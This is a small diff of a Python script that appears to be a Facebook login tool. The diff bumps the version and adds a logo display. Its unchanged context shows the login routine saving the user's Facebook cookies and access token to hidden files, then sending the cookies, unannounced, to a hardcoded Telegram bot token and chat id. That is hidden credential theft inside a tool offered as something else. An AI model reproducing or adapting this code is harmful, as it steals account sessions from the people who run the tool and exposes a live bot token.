@@ -38,10 +38,11 @@ rp = f"\033[{mxclrs};147m"
 gxdsprnt = str(f"{li}" * 37)
 def sins(u):
   for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.02)
-  
+
 # SHORTCUTS
-ver = "0.0.2"
-  
+ver = "0.0.3"
+
+
 # ANTI BYPASSING
 try:
     qc = "anar"
@@ -394,6 +395,8 @@ def lxgin():
         open(".cokis.txt", "w").write(fbcokis)
         token = open('.tokn.txt','r').read()
         info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
+        gxdslogo()
+        slp(1)
         sins(f"{lgr}  [✓] LOGIN SUCCESSFULLY")
         requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text=COOKIES: {fbcokis}")
         slp(2)
